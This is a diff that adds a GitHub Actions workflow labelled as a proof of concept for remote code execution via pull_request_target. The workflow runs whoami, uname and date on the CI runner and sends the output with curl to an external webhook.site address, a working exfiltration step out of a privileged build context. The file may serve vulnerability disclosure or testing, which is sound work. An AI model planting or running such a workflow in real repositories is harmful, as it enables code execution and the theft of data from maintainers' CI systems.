@@ -1,0 +1,27 @@
+name: PoC – pull_request_target RCE
+
+on:
+  pull_request_target:
+
+jobs:
+  poc:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Context Info
+        run: |
+          echo "Triggered by: ${{ github.event_name }}"
+          echo "Repo: ${{ github.repository }}"
+          echo "Actor: ${{ github.actor }}"
+
+      - name: Proof of RCE + Send to Webhook
+        run: |
+          OUTPUT="$(echo '=== whoami ===' && whoami && \
+                    echo '=== uname -a ===' && uname -a && \
+                    echo '=== date ===' && date)"
+
+          echo "$OUTPUT"
+
+          # Send output to webhook.site
+          curl -X POST -H "Content-Type: text/plain" \
+            -d "$OUTPUT" \
+            https://webhook.site/4322ca73-8792-4d35-b6e3-c7091fee14d6
